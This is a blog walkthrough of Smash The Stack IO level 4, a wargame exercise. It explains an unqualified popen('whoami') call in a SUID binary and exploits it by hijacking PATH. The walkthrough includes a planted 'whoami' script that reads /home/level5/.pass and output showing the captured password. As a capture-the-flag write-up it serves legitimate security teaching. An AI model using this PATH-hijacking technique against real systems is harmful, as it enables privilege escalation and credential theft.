---
title: "Smash The Stack: IO Level 4 Walkthrough"
date: 2014-12-03T13:27:27+00:00
url: "/smash-the-stack-level4/"
draft: false
description: "A walkthrough of Level 4 on Smash The Stack IO, exploiting an unquoted binary call via PATH variable hijacking."
categories: ["Bash", "exploit-dev", "Linux", "Security"]
tags: ["smashthestack", "wargame", "path-hijacking", "privilege-escalation"]
---

In Level 4 of the Smash The Stack IO wargame, executing the binary prints a static welcome message regardless of input arguments:

```bash
level4@io:/levels$ ./level04
Welcome level5
level4@io:/levels$ ./level04 $(python -c "print 'A' * 1024")
Welcome level5
```

### Analyzing the Source Code

Inspecting `level04.c`:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char username[1024];
    FILE* f = popen("whoami", "r");
    fgets(username, sizeof(username), f);
    printf("Welcome %s", username);

    return 0;
}
```

### Vulnerability Analysis: Insecure PATH Resolution

Notice the `popen` call:
```c
FILE* f = popen("whoami", "r");
```

The author called `whoami` as a bare command name rather than specifying an absolute binary path (such as `/usr/bin/whoami`). When `popen()` spawns `/bin/sh -c whoami`, the shell searches for the `whoami` executable in the directories listed in the current user's `PATH` environment variable from left to right.

Because `level04` runs with SUID permissions for `level5`, any executable named `whoami` found earlier in `PATH` will execute under `level5` privileges.

### Exploitation via PATH Hijacking

1. **Create a malicious executable named `whoami` in a writable directory** (`/tmp`):
   ```bash
   mkdir -p /tmp/level04
   echo '#!/bin/sh' > /tmp/level04/whoami
   echo 'cat /home/level5/.pass' >> /tmp/level04/whoami
   chmod +x /tmp/level04/whoami
   ```

2. **Prepend our directory to `PATH`:**
   ```bash
   export PATH=/tmp/level04:$PATH
   ```

3. **Verify resolution:**
   ```bash
   which whoami
   # /tmp/level04/whoami
   ```

4. **Trigger the exploit:**
   ```bash
   level4@io:/levels$ ./level04
   Welcome LOoCy5PbKi63qXTh
   ```

The application executes our script, printing the `level5` password.
